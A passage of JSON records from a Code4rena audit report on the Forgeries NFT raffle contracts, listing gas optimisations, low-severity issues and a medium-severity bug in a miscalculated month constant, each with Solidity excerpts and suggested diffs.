      "content": "\nhttps://github.com/code-423n4/2022-12-forgeries/blob/fc271cf20c05ce857d967728edfb368c58881d85/src/VRFNFTRandomDrawFactory.sol#L38-L51\n\n|        | Min    | Average | Median   | Max   |\n| ------ | --- | ------- | ----- | ----- |\n| Before | 46872    | 183639   | 213232 | 239795 |\n| After  | 46860    | 183631   | 213224 | 239783 |\n\n```solidity\nFile: /src/VRFNFTRandomDrawFactory.sol\n38:    function makeNewDraw(IVRFNFTRandomDraw.Settings memory settings)\n39:        external\n40:        returns (address)\n41:    {\n42:        address admin = msg.sender;\n43:        // Clone the contract\n44:        address newDrawing = ClonesUpgradeable.clone(implementation);\n45:        // Setup the new drawing\n46:        IVRFNFTRandomDraw(newDrawing).initialize(admin, settings);\n47:        // Emit event for indexing\n48:        emit SetupNewDrawing(admin, newDrawing);\n49:        // Return address for integration or testing\n50:        return newDrawing;\n51:    }\n```\n\n```diff\ndiff --git a/src/VRFNFTRandomDrawFactory.sol b/src/VRFNFTRandomDrawFactory.sol\nindex 84caedb..616cb0a 100644\n--- a/src/VRFNFTRandomDrawFactory.sol\n+++ b/src/VRFNFTRandomDrawFactory.sol\n@@ -39,13 +39,12 @@ contract VRFNFTRandomDrawFactory is\n         external\n         returns (address)\n     {\n-        address admin = msg.sender;\n         // Clone the contract\n         address newDrawing = ClonesUpgradeable.clone(implementation);\n         // Setup the new drawing\n-        IVRFNFTRandomDraw(newDrawing).initialize(admin, settings);\n+        IVRFNFTRandomDraw(newDrawing).initialize(msg.sender, settings);\n         // Emit event for indexing\n-        emit SetupNewDrawing(admin, newDrawing);\n+        emit SetupNewDrawing(msg.sender, newDrawing);\n         // Return address for integration or testing\n         return newDrawing;\n     }\n```\n\nhttps://github.com/code-423n4/2022-12-forgeries/blob/fc271cf20c05ce857d967728edfb368c58881d85/src/VRFNFTRandomDraw.sol#L277-L300\n\n```solidity\nFile: /src/VRFNFTRandomDraw.sol\n277:    function winnerClaimNFT() external {\n278:        // Assume (potential) winner calls this fn, cache.\n279:        address user = msg.sender;\n\n281:        // Check if this user has indeed won.\n282:        if (!hasUserWon(user)) {\n283:            revert USER_HAS_NOT_WON();\n284:        }\n\n286:        // Emit a celebratory event\n287:        emit WinnerSentNFT(\n288:            user,\n289:            address(settings.token),\n290:            settings.tokenId,\n291:            settings\n292:        );\n\n294:        // Transfer token to the winter.\n295:        IERC721EnumerableUpgradeable(settings.token).transferFrom(\n296:            address(this),\n297:            msg.sender,\n298:            settings.tokenId\n299:        );\n300:    }\n```\n\n```diff\ndiff --git a/src/VRFNFTRandomDraw.sol b/src/VRFNFTRandomDraw.sol\nindex 668bc56..06ae5b2 100644\n--- a/src/VRFNFTRandomDraw.sol\n+++ b/src/VRFNFTRandomDraw.sol\n@@ -276,16 +276,15 @@ contract VRFNFTRandomDraw is\n     /// @notice Function for the winner to call to retrieve their NFT\n     function winnerClaimNFT() external {\n         // Assume (potential) winner calls this fn, cache.\n-        address user = msg.sender;\n\n         // Check if this user has indeed won.\n-        if (!hasUserWon(user)) {\n+        if (!hasUserWon(msg.sender)) {\n             revert USER_HAS_NOT_WON();\n         }\n\n         // Emit a celebratory event\n         emit WinnerSentNFT(\n-            user,\n+            msg.sender,\n             address(settings.token),\n             settings.tokenId,\n             settings\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Forgeries",
      "source_link": "https://code4rena.com/reports/2022-12-forgeries",
      "github_link": "#g-07-caching-global-variables-is-more-expensive-than-using-the-actual-variable-use-msgsender-instead-of-caching-it",
      "tags": [],
      "finders": []
    },
    {
      "id": "6407",
      "title": "[G-06] A modifier used only once and not being inherited should be inlined to save gas",
      "impact": "GAS",
      "content": "\nhttps://github.com/code-423n4/2022-12-forgeries/blob/fc271cf20c05ce857d967728edfb368c58881d85/src/ownable/OwnableUpgradeable.sol#L44-L49\n\n```solidity\nFile: /src/ownable/OwnableUpgradeable.sol\n44:    modifier onlyPendingOwner() {\n45:        if (msg.sender != _pendingOwner) {\n46:            revert ONLY_PENDING_OWNER();\n47:        }\n48:        _;\n49:    }\n```\n\nThe above modifer is only used in the following:\n\nhttps://github.com/code-423n4/2022-12-forgeries/blob/fc271cf20c05ce857d967728edfb368c58881d85/src/ownable/OwnableUpgradeable.sol#L119-L125\n\n```solidity\nFile: /src/ownable/OwnableUpgradeable.sol\n119:    function acceptOwnership() public onlyPendingOwner {\n120:        emit OwnerUpdated(_owner, msg.sender);\n\n122:        _owner = _pendingOwner;\n\n124:        delete _pendingOwner;\n125:    }\n```\n\n```diff\ndiff --git a/src/ownable/OwnableUpgradeable.sol b/src/ownable/OwnableUpgradeable.sol\nindex bfc7eef..d27530c 100644\n--- a/src/ownable/OwnableUpgradeable.sol\n+++ b/src/ownable/OwnableUpgradeable.sol\n@@ -116,7 +116,10 @@ abstract contract OwnableUpgradeable is IOwnableUpgradeable, Initializable {\n     }\n\n     /// @notice Accepts an ownership transfer\n-    function acceptOwnership() public onlyPendingOwner {\n+    function acceptOwnership() public{\n+      if (msg.sender != _pendingOwner) {\n+            revert ONLY_PENDING_OWNER();\n+        }\n         emit OwnerUpdated(_owner, msg.sender);\n\n         _owner = _pendingOwner;\n\n\t\t  delete _pendingOwner;     \n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Forgeries",
      "source_link": "https://code4rena.com/reports/2022-12-forgeries",
      "github_link": "#g-06-a-modifier-used-only-once-and-not-being-inherited-should-be-inlined-to-save-gas",
      "tags": [],
      "finders": []
    },
    {
      "id": "6406",
      "title": "[G-05] Using unchecked blocks to save gas",
      "impact": "GAS",
      "content": "\nSolidity version 0.8+ comes with implicit overflow and underflow checks on unsigned integers. When an overflow or an underflow isnâ€™t possible (as an example, when a comparison is made before the arithmetic operation), some gas can be saved by using an unchecked block.\n\n[See resource](https://github.com/ethereum/solidity/issues/10695).\n\nhttps://github.com/code-423n4/2022-12-forgeries/blob/fc271cf20c05ce857d967728edfb368c58881d85/src/VRFNFTRandomDraw.sol#L112-L115\n\n### Saves 43 gas on average\n\n|        | Min    | Average | Median   | Max   |\n| ------ | --- | ------- | ----- | ----- |\n| Before | 43790    | 146546   | 175523 | 192923 |\n| After  | 43790    | 146503   | 175451 | 192851 |\n\n```solidity\nFile: /src/VRFNFTRandomDraw.sol\n112:        if (\n113:            _settings.drawingTokenEndId < _settings.drawingTokenStartId ||\n114:            _settings.drawingTokenEndId - _settings.drawingTokenStartId < 2\n115:        ) {\n```\n\nThe operation ` _settings.drawingTokenEndId - _settings.drawingTokenStartId` cannot underflow as it would only be performed if the operation `_settings.drawingTokenEndId < _settings.drawingTokenStartId` is false(Short circuit rules)\n\n```diff\ndiff --git a/src/VRFNFTRandomDraw.sol b/src/VRFNFTRandomDraw.sol\nindex 668bc56..b33b93e 100644\n--- a/src/VRFNFTRandomDraw.sol\n+++ b/src/VRFNFTRandomDraw.sol\n@@ -109,12 +109,15 @@ contract VRFNFTRandomDraw is\n\n         // Validate token range: end needs to be greater than start\n         // and the size of the range needs to be at least 2 (end is exclusive)\n-        if (\n+        unchecked {\n+            if (\n             _settings.drawingTokenEndId < _settings.drawingTokenStartId ||\n             _settings.drawingTokenEndId - _settings.drawingTokenStartId < 2\n         ) {\n             revert DRAWING_TOKEN_RANGE_INVALID();\n         }\n+        }\n+\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Forgeries",
      "source_link": "https://code4rena.com/reports/2022-12-forgeries",
      "github_link": "#g-05-using-unchecked-blocks-to-save-gas",
      "tags": [],
      "finders": []
    },
    {
      "id": "6405",
      "title": "[G-04] The result of a function call should be cached rather than re-calling the function",
      "impact": "GAS",
      "content": "\nConsider caching the following:\n\nhttps://github.com/code-423n4/2022-12-forgeries/blob/fc271cf20c05ce857d967728edfb368c58881d85/src/VRFNFTRandomDraw.sol#L304-L320\n\n### VRFNFTRandomDraw.sol.lastResortTimelockOwnerClaimNFT(): The results of `owner()` should be cached instead of calling it twice\n\n|        | Min    | Average | Median   | Max   |\n| ------ | --- | ------- | ----- | ----- |\n| Before | 381    | 11061   | 11061 | 21741 |\n| After  | 381    | 10992   | 10992 | 21604 |\n\n```solidity\nFile: /src/VRFNFTRandomDraw.sol\n304:    function lastResortTimelockOwnerClaimNFT() external onlyOwner {\n305:        // If recoverTimelock is not setup, or if not yet occurred\n306:        if (settings.recoverTimelock > block.timestamp) {\n307:            // Stop the withdraw\n308:            revert RECOVERY_IS_NOT_YET_POSSIBLE();\n309:        }\n\n311:        // Send event for indexing that the owner reclaimed the NFT\n312:        emit OwnerReclaimedNFT(owner()); //@audit: Initial call\n\n314:        // Transfer token to the admin/owner.\n315:        IERC721EnumerableUpgradeable(settings.token).transferFrom(\n316:            address(this),\n317:            owner(),//@audit: Second call\n318:            settings.tokenId\n319:        );\n320:    }\n```\n\n```diff\ndiff --git a/src/VRFNFTRandomDraw.sol b/src/VRFNFTRandomDraw.sol\nindex 668bc56..00f000d 100644\n--- a/src/VRFNFTRandomDraw.sol\n+++ b/src/VRFNFTRandomDraw.sol\n@@ -307,14 +307,15 @@ contract VRFNFTRandomDraw is\n             // Stop the withdraw\n             revert RECOVERY_IS_NOT_YET_POSSIBLE();\n         }\n+        address _ownerAddr = owner();\n\n         // Send event for indexing that the owner reclaimed the NFT\n-        emit OwnerReclaimedNFT(owner());\n+        emit OwnerReclaimedNFT(_ownerAddr);\n\n         // Transfer token to the admin/owner.\n         IERC721EnumerableUpgradeable(settings.token).transferFrom(\n             address(this),\n-            owner(),\n+            _ownerAddr,\n             settings.tokenId\n         );\n     }\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Forgeries",
      "source_link": "https://code4rena.com/reports/2022-12-forgeries",
      "github_link": "#g-04-the-result-of-a-function-call-should-be-cached-rather-than-re-calling-the-function",
      "tags": [],
      "finders": []
    },
    {
      "id": "6404",
      "title": "[G-03] Cache storage values in memory to minimize SLOADs",
      "impact": "GAS",
      "content": "\nThe code can be optimized by minimizing the number of SLOADs.\n\nSLOADs are expensive (100 gas after the 1st one) compared to MLOADs/MSTOREs (3 gas each). Storage values read multiple times should instead be cached in memory the first time (costing 1 SLOAD) and then read from this cache to avoid multiple SLOADs.\n\nhttps://github.com/code-423n4/2022-12-forgeries/blob/fc271cf20c05ce857d967728edfb368c58881d85/src/VRFNFTRandomDraw.sol#L141-L169\n\n### VRFNFTRandomDraw.sol.\\_requestRoll(): We could cache request.drawTimelock instead of calling it twice\n\n```solidity\nFile: /src/VRFNFTRandomDraw.sol\n141:    function _requestRoll() internal {\n\n148:        // If the number has been drawn and\n149:        if (\n150:            request.hasChosenRandomNumber &&\n151:            // Draw timelock not yet used\n152:            request.drawTimelock != 0 && //@audit: 1st call \n153:            request.drawTimelock > block.timestamp //@audit: 2nd call\n154:        ) {\n155:            revert STILL_IN_WAITING_PERIOD_BEFORE_REDRAWING();\n156:        }\n\n158:        // Setup re-draw timelock\n159:        request.drawTimelock = block.timestamp + settings.drawBufferTime;\n\n169:    }\n```\n\n```diff\ndiff --git a/src/VRFNFTRandomDraw.sol b/src/VRFNFTRandomDraw.sol\nindex 668bc56..e235c0b 100644\n--- a/src/VRFNFTRandomDraw.sol\n+++ b/src/VRFNFTRandomDraw.sol\n@@ -145,12 +145,13 @@ contract VRFNFTRandomDraw is\n             revert REQUEST_IN_FLIGHT();\n         }\n\n-        // If the number has been drawn and\n+        // If the number has been drawn\n+        uint256 _requestDrawTimelock = request.drawTimelock ;\n         if (\n             request.hasChosenRandomNumber &&\n             // Draw timelock not yet used\n-            request.drawTimelock != 0 &&\n-            request.drawTimelock > block.timestamp\n+            _requestDrawTimelock != 0 &&\n+            _requestDrawTimelock > block.timestamp\n         ) {\n             revert STILL_IN_WAITING_PERIOD_BEFORE_REDRAWING();\n         }\n```\n\n\nhttps://github.com/code-423n4/2022-12-forgeries/blob/fc271cf20c05ce857d967728edfb368c58881d85/src/VRFNFTRandomDraw.sol#L277-L300\n\n### VRFNFTRandomDraw.sol.winnerClaimNFT(): settings.token and settings.tokenId should be cached. Also no need to cast settings.token as it's an address already - Saves 62 gas on average\n\n\n|        | Min    | Average | Median   | Max   |\n| ------ | --- | ------- | ----- | ----- |\n| Before | 422    | 11638   | 2422 | 27624 |\n| After  | 422    | 11576   | 2422 | 27469 |\n\n```solidity\nFile: /src/VRFNFTRandomDraw.sol\n277:    function winnerClaimNFT() external {\n\n287:        emit WinnerSentNFT(\n288:            user,\n289:            address(settings.token),\n290:            settings.tokenId,\n291:            settings\n292:        );\n\n294:        // Transfer token to the winter.\n295:        IERC721EnumerableUpgradeable(settings.token).transferFrom(\n296:            address(this),\n297:            msg.sender,\n298:            settings.tokenId\n299:        );\n300:    }\n```\n\n```diff\ndiff --git a/src/VRFNFTRandomDraw.sol b/src/VRFNFTRandomDraw.sol\nindex 668bc56..407a5f4 100644\n--- a/src/VRFNFTRandomDraw.sol\n+++ b/src/VRFNFTRandomDraw.sol\n@@ -283,19 +283,21 @@ contract VRFNFTRandomDraw is\n             revert USER_HAS_NOT_WON();\n         }\n\n+        address _token = settings.token;\n+        uint256 _tokenId = settings.tokenId;\n         // Emit a celebratory event\n         emit WinnerSentNFT(\n             user,\n-            address(settings.token),\n-            settings.tokenId,\n+            _token,\n+            _tokenId,\n             settings\n         );\n\n         // Transfer token to the winter.\n-        IERC721EnumerableUpgradeable(settings.token).transferFrom(\n+        IERC721EnumerableUpgradeable(_token).transferFrom(\n             address(this),\n             msg.sender,\n-            settings.tokenId\n+            _tokenId\n         );\n     }\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Forgeries",
      "source_link": "https://code4rena.com/reports/2022-12-forgeries",
      "github_link": "#g-03-cache-storage-values-in-memory-to-minimize-sloads",
      "tags": [],
      "finders": []
    },
    {
      "id": "6403",
      "title": "[G-02] Emitting storage values instead of the memory one.",
      "impact": "GAS",
      "content": "\nHere, the values emitted shouldnâ€™t be read from storage. The existing memory values should be used instead:\n\nhttps://github.com/code-423n4/2022-12-forgeries/blob/fc271cf20c05ce857d967728edfb368c58881d85/src/VRFNFTRandomDraw.sol#L75-L138\n\n### Save 499 gas on average\n\n|        | Min    | Average | Median   | Max   |\n| ------ | --- | ------- | ----- | ----- |\n| Before | 43790    | 146546   | 175523 | 192923 |\n| After  | 43790    | 146047   | 174692 | 192092 |\n\n```solidity\nFile: /src/VRFNFTRandomDraw.sol\n75:    function initialize(address admin, Settings memory _settings)\n76:        public\n77:        initializer\n78:    {\n79:        // Set new settings\n80:        settings = _settings;\n\n122:        // Emit initialized event for indexing\n123:        emit InitializedDraw(msg.sender, settings);\n```\n\n```diff\ndiff --git a/src/VRFNFTRandomDraw.sol b/src/VRFNFTRandomDraw.sol\nindex 668bc56..7955234 100644\n--- a/src/VRFNFTRandomDraw.sol\n+++ b/src/VRFNFTRandomDraw.sol\n@@ -120,7 +120,7 @@ contract VRFNFTRandomDraw is\n         __Ownable_init(admin);\n\n         // Emit initialized event for indexing\n-        emit InitializedDraw(msg.sender, settings);\n+        emit InitializedDraw(msg.sender, _settings);\n\n         // Get owner of raffled tokenId and ensure the current owner is the admin\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Forgeries",
      "source_link": "https://code4rena.com/reports/2022-12-forgeries",
      "github_link": "#g-02-emitting-storage-values-instead-of-the-memory-one",
      "tags": [],
      "finders": []
    },
    {
      "id": "6402",
      "title": "[G-01] Pack structs by putting data types in ascending size (We can save up to ~6k gas)",
      "impact": "GAS",
      "content": "\nAs the solidity EVM works with 32 bytes, variables less than 32 bytes should be packed inside a struct so that they can be stored in the same slot, this saves gas when writing to storage ~20000 gas.\n\nhttps://github.com/code-423n4/2022-12-forgeries/blob/fc271cf20c05ce857d967728edfb368c58881d85/src/interfaces/IVRFNFTRandomDraw.sol#L59-L68\n\n### We can use a smaller type for uint256 drawTimelock as it's simply a timestamp. Using uint64 should be safe for 532 years. We save 1 Storage SLOT from 4 SLOTS to 3 SLOTS (~2K gas)\n\n```solidity\nFile: /src/interfaces/IVRFNFTRandomDraw.sol\n59:    struct CurrentRequest {\n60:        /// @notice current chainlink request id\n61:        uint256 currentChainlinkRequestId;\n62:        /// @notice current chosen random number\n63:        uint256 currentChosenTokenId;\n64:        /// @notice has chosen a random number (in case random number = 0(in case random number = 0)(in case random number = 0)(in case random number = 0)(in case random number = 0)(in case random number = 0)(in case random number = 0)(in case random number = 0)(in case random number = 0))\n65:        bool hasChosenRandomNumber;\n66:        /// @notice time lock (block.timestamp) that a re-draw can be issued\n67:        uint256 drawTimelock;\n68:    }\n```\n\n\n```diff\ndiff --git a/src/interfaces/IVRFNFTRandomDraw.sol b/src/interfaces/IVRFNFTRandomDraw.sol\nindex 4775288..af1d928 100644\n--- a/src/interfaces/IVRFNFTRandomDraw.sol\n+++ b/src/interfaces/IVRFNFTRandomDraw.sol\n@@ -64,7 +64,7 @@ interface IVRFNFTRandomDraw {\n         /// @notice has chosen a random number (in case random number = 0(in case random number = 0)(in case random number = 0)(in case random number = 0)(in case random number = 0)(in case random number = 0)(in case random number = 0)(in case random number = 0)(in case random number = 0))\n         bool hasChosenRandomNumber;\n         /// @notice time lock (block.timestamp) that a re-draw can be issued\n-        uint256 drawTimelock;\n+        uint64 drawTimelock;\n     }\n```\n\n\nhttps://github.com/code-423n4/2022-12-forgeries/blob/fc271cf20c05ce857d967728edfb368c58881d85/src/interfaces/IVRFNFTRandomDraw.sol#L71-L90\n\n### We can save 2 SLOTs here by packing address token with uint64 subscriptionId and also changing the type of  uint256 recoverTimelock which is a timestamp to uint64 which should be safe for more than 500 years (Saves ~4k gas)\n\n```solidity\nFile: /src/interfaces/IVRFNFTRandomDraw.sol\n71:    struct Settings {\n72:        /// @notice Token Contract to put up for raffle\n73:        address token;\n74:        /// @notice Token ID to put up for raffle\n75:        uint256 tokenId;\n76:        /// @notice Token that each (sequential) ID has a entry in the raffle.\n77:        address drawingToken;\n78:        /// @notice Start token ID for the drawing (if totalSupply = 20 but the first token is 5 (5-25), setting this to 5 would fix the ordering)\n79:        uint256 drawingTokenStartId;\n80:        /// @notice End token ID for the drawing (exclusive) (token ids 0 - 9 would be 10 in this field)\n81:        uint256 drawingTokenEndId;\n82:        /// @notice Draw buffer time â€“ time until a re-drawing can occur if the selected user cannot or does not claim the NFT.\n83:        uint256 drawBufferTime;\n84:        /// @notice block.timestamp that the admin can recover the NFT (as a safety fallback)\n85:        uint256 recoverTimelock;\n86:        /// @notice Chainlink gas keyhash\n87:        bytes32 keyHash;\n88:        /// @notice Chainlink subscription id\n89:        uint64 subscriptionId;\n90:    }\n```\n\n```diff\ndiff --git a/src/interfaces/IVRFNFTRandomDraw.sol b/src/interfaces/IVRFNFTRandomDraw.sol\nindex 4775288..7923c29 100644\n--- a/src/interfaces/IVRFNFTRandomDraw.sol\n+++ b/src/interfaces/IVRFNFTRandomDraw.sol\n@@ -69,24 +69,24 @@ interface IVRFNFTRandomDraw {\n\n     /// @notice Struct to organize user settings\n     struct Settings {\n+        /// @notice Chainlink subscription id\n+        uint64 subscriptionId;\n         /// @notice Token Contract to put up for raffle\n         address token;\n         /// @notice Token ID to put up for raffle\n         uint256 tokenId;\n         /// @notice Token that each (sequential) ID has a entry in the raffle.\n         address drawingToken;\n+        /// @notice block.timestamp that the admin can recover the NFT (as a safety fallback)\n+        uint64 recoverTimelock;\n         /// @notice Start token ID for the drawing (if totalSupply = 20 but the first token is 5 (5-25), setting this to 5 would fix the ordering)\n         uint256 drawingTokenStartId;\n         /// @notice End token ID for the drawing (exclusive) (token ids 0 - 9 would be 10 in this field)\n         uint256 drawingTokenEndId;\n         /// @notice Draw buffer time â€“ time until a re-drawing can occur if the selected user cannot or does not claim the NFT.\n         uint256 drawBufferTime;\n-        /// @notice block.timestamp that the admin can recover the NFT (as a safety fallback)\n-        uint256 recoverTimelock;\n         /// @notice Chainlink gas keyhash\n         bytes32 keyHash;\n-        /// @notice Chainlink subscription id\n-        uint64 subscriptionId;\n     }\n```\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Forgeries",
      "source_link": "https://code4rena.com/reports/2022-12-forgeries",
      "github_link": "#g-01-pack-structs-by-putting-data-types-in-ascending-size-we-can-save-up-to-6k-gas",
      "tags": [],
      "finders": []
    },
    {
      "id": "6401",
      "title": "[L-03] NFTs are not guaranteed to have sequential IDs",
      "impact": "LOW",
      "content": "\nhttps://github.com/code-423n4/2022-12-forgeries/blob/main/src/interfaces/IVRFNFTRandomDraw.sol#L71-L90\n\nhttps://github.com/code-423n4/2022-12-forgeries/blob/main/src/VRFNFTRandomDraw.sol#L249-L256\n\nhttps://github.com/code-423n4/2022-12-forgeries/blob/main/src/VRFNFTRandomDraw.sol#L271\n\n### Impact\n\nAccordingly to [EIP-721](https://eips.ethereum.org/EIPS/eip-721):\n\n> **NFT Identifiers**\n> \n> Every NFT is identified by a unique uint256 ID inside the ERC-721 smart contract. This identifying number SHALL NOT change for the life of the contract. The pair (contract address, uint256 tokenId) will then be a globally unique and fully-qualified identifier for a specific asset on an Ethereum chain. While some ERC-721 smart contracts may find it convenient to start with ID 0 and simply increment by one for each new NFT, **callers SHALL NOT assume that ID numbers have any specific pattern to them, and MUST treat the ID as a â€œblack boxâ€.** Also note that NFTs MAY become invalid (be destroyed). Please see the enumeration functions for a supported enumeration interface.\n> \n> The choice of uint256 allows a wide variety of applications because UUIDs and sha3 hashes are directly convertible to uint256.\n\nThis project, aims to create a raffle [specifying](https://github.com/code-423n4/2022-12-forgeries/blob/main/src/interfaces/IVRFNFTRandomDraw.sol#L71-L90) that the potential winner will be between a range, where the lower limit is set by the candidate with the lowest TokenId and the candidate with the highest TokenId (`+1` to be included in the draw) sets the upper limit. As stated in the previous quote, this could generate gigantic ranges with numerous empty tokens given how it is [calculated](https://github.com/code-423n4/2022-12-forgeries/blob/main/src/VRFNFTRandomDraw.sol#L249-L256) (see [ENS](https://etherscan.io/token/0x57f1887a8bf19b14fc0df6fd9b2acc9af147ea85#readContract) as an example of empty slots and how the ids [are generated](https://docs.ens.domains/dapp-developer-guide/ens-as-nft)).\n\nAfter generating the random number via VRF, the winner [is selected by](https://github.com/code-423n4/2022-12-forgeries/blob/main/src/VRFNFTRandomDraw.sol#L249-L256) _moduluing_ by the range plus the initial token id. The result is then used to determine [the winner](https://github.com/code-423n4/2022-12-forgeries/blob/main/src/VRFNFTRandomDraw.sol#L271). \n\nConsidering the costs to query VRF and the waiting time to claim the prize, this issue may turn the contract unusable. \n\nNote that any used method when casting the collection to IERC721EnumerableUpgradeable has the same effect as casting to IERC721, and giving how a raffle is setup, it seems the original intent was to use indexes instead of ids.\n\nExternal requirements:\n- non-sequential NFTs.\n\n### Proof of Concept\n\nConsider a scenario where:\n\n```\nDrawing NFT Collection: ABC\nTokenIDs: [1,10,1000]\nTotalSupply: 3\n```\n\nSetting a raffle to include each possible token results in [1..1001[ alternatives. Since there are only three possible winners, there's only `0.3%` of a successful draw.\n\n### Recommended Mitigation Steps\n\nDepending on the direction the project takes:\n1. Change the way the setup is performed;\n2. Give more guarantees that only collections with sequential ids are used (note that the same problem might happen in nfts with high number of burns);\n3. Only use indexed collections.\n\n## Non-Critical Issues Summary\n| Number |Issues Details|Context|\n|:--:|:-------|:--:|\n| [N-01] | `getRequestDetails()` should include the tokenid |1|\n| [N-02] | Avoid setting time variables manually  |1|\n| [N-03] | Use constants instead of immutable variables | 1 |\n| [N-04] | Uppercase immutable variables | 6 |\n| [N-05] | Empty blocks should be avoided | 1 |\n| [N-06] | Missing _NatSpec_ | 1 |\n| [N-07] | Contracts that extend interfaces should override its methods | 3 |\n| [N-08] | `_requestRoll()` after confirming that the raffle is viable  |1|\n| [N-09] | `IERC721EnumerableUpgradeable` may lead to false assumptions | 6 |\n| [N-10] | `drawingTokenEndId` should be inclusive or altered to a range | 1 |\n| [N-11] | `fulfillRandomWords` must not revert | 1 |\n\nTotal: 11 issues\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Forgeries",
      "source_link": "https://code4rena.com/reports/2022-12-forgeries",
      "github_link": "#l-03-nfts-are-not-guaranteed-to-have-sequential-ids",
      "tags": [],
      "finders": []
    },
    {
      "id": "6400",
      "title": "[L-02] An owner can resign and lead to locked NFTs",
      "impact": "LOW",
      "content": "\nSince there's a possibility of unclaimed drafts, the owner is the only one able to rescue the prize NFT from the raffle contract. Thus, having the ability to resign ownership (including non-intentional) could lead to stuck NFTs.\n\nConsider altering or removing [resignOwnership](https://github.com/code-423n4/2022-12-forgeries/blob/main/src/ownable/OwnableUpgradeable.sol#L112-L116) method: \n\n```solidity\n    /// @notice Resign ownership of contract\n    /// @dev only callably by the owner, dangerous call.\n    function resignOwnership() public onlyOwner {\n        _transferOwnership(address(0));\n    }\n```\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Forgeries",
      "source_link": "https://code4rena.com/reports/2022-12-forgeries",
      "github_link": "#l-02-an-owner-can-resign-and-lead-to-locked-nfts",
      "tags": [],
      "finders": []
    },
    {
      "id": "6399",
      "title": "[L-01] `redraw()` should be called by anyone",
      "impact": "LOW",
      "content": "\n[VRFNFTRandomDraw.sol#L203-L225](https://github.com/code-423n4/2022-12-forgeries/blob/main/src/VRFNFTRandomDraw.sol#L203-L225) \n\nRedrawing a raffle already protects the winner through the timelocking mechanism. Dependency on the owner should be avoidable in this instance by removing the modifier `onlyOwner`, allowing anyone to redraw the raffle.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Forgeries",
      "source_link": "https://code4rena.com/reports/2022-12-forgeries",
      "github_link": "#l-01-redraw-should-be-called-by-anyone",
      "tags": [],
      "finders": []
    },
    {
      "id": "6398",
      "title": "[M-03] Protocol safeguards for time durations are skewed by a factor of 7. Protocol may potentially lock NFT for period of 7 years.",
      "impact": "MEDIUM",
      "content": "\nIn `VRFNFtRandomDraw\\.sol initialize()`, the MONTH_IN_SECONDS variable is used to validate two values:\n\n*   configured time between redraws is under 1 month\n*   recoverTimelock (when NFT can be returned to owner) is less than 1 year in the future\n\n<!---->\n\n    if (_settings.drawBufferTime > MONTH_IN_SECONDS) {\n        revert REDRAW_TIMELOCK_NEEDS_TO_BE_LESS_THAN_A_MONTH();\n    }\n    ...\n    if (\n        _settings.recoverTimelock >\n        block.timestamp + (MONTH_IN_SECONDS * 12)\n    ) {\n        revert RECOVER_TIMELOCK_NEEDS_TO_BE_LESS_THAN_A_YEAR();\n    }\n\nThe issue is that MONTH_IN_SECONDS is calculated incorrectly:\n\n    /// @dev 60 seconds in a min, 60 mins in an hour\n    uint256 immutable HOUR_IN_SECONDS = 60 * 60;\n    /// @dev 24 hours in a day 7 days in a week\n    uint256 immutable WEEK_IN_SECONDS = (3600 * 24 * 7);\n    // @dev about 30 days in a month\n    uint256 immutable MONTH_IN_SECONDS = (3600 * 24 * 7) * 30;\n\nMONTH_IN_SECONDS multiplies by 7 incorrectly, as it was copied from WEEK_IN_SECONDS. Therefore, actual seconds calculated is equivalent of 7 months.\nTherefore, recoverTimelock can be up to a non-sensible value of 7 years, and re-draws every up to 7 months.\n\n### Impact\n\nProtocol safeguards for time durations are skewed by a factor of 7. Protocol may potentially lock NFT for period of 7 years.\n\n### Recommended Mitigation Steps\n\nFix MONTH_IN_SECONDS calculation:\n`uint256 immutable MONTH_IN_SECONDS = (3600 * 24) * 30;`\n\n**[iainnash (Forgeries) confirmed](https://github.com/code-423n4/2022-12-forgeries-findings/issues/273)** \n\n***\n\n",
      "summary": "\nThis bug report is about the VRFNFtRandomDraw.sol file in the code-423n4/2022-12-forgeries repository. In the initialize() function, the MONTH_IN_SECONDS variable is used to validate two values: the configured time between redraws and the recoverTimelock (when the NFT can be returned to the owner). The issue is that MONTH_IN_SECONDS is calculated incorrectly, multiplying by 7 instead of 30. This means that recoverTimelock can be up to 7 years, and redraws every up to 7 months.\n\nThe impact of this bug is that the protocol safeguards for time durations are skewed by a factor of 7, and the protocol may potentially lock NFT for a period of 7 years. This bug was discovered through manual audit.\n\nThe recommended mitigation step is to fix the MONTH_IN_SECONDS calculation by replacing the line `uint256 immutable MONTH_IN_SECONDS = (3600 * 24 * 7) * 30;` with `uint256 immutable MONTH_IN_SECONDS = (3600 * 24) * 30;`.",
      "quality_score": 5,
      "rarity_score": 5,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Forgeries",
      "source_link": "https://code4rena.com/reports/2022-12-forgeries",
      "github_link": "https://github.com/code-423n4/2022-12-forgeries-findings/issues/273",
      "tags": [],
      "finders": [
        "Trust",
        "aga7hokakological",
        "Apocalypto",
        "yixxas",
        "kaliberpoziomka8552",
        "subtle77",
        "Matin",
        "Madalad",
        "evan",
        "mookimgo",
        "wagmi",
        "poirots"
      ]
    },
    {
      "id": "6397",
      "title": "[M-02] VRFNFTRandomDraw admin can prevent created or started raffle from taking place",
      "impact": "MEDIUM",
